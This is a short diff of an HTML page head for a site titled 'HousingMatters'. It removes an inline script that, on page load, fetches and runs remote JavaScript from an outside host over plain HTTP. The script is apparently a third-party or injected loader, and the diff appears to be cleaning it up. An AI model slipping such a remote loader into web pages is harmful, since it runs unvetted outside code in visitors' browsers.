@@ -1,10 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script type="text/javascript">
-var key=1;
-(function(a) {var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = 'http://dressninja.com/growth_booster/get_growth_booster.js?key='+key;var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);}(window, document))
-</script>
+
 <title>HousingMatters</title>
 <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
 <!-- Include external files and scripts here (See HTML helper for more info.) -->
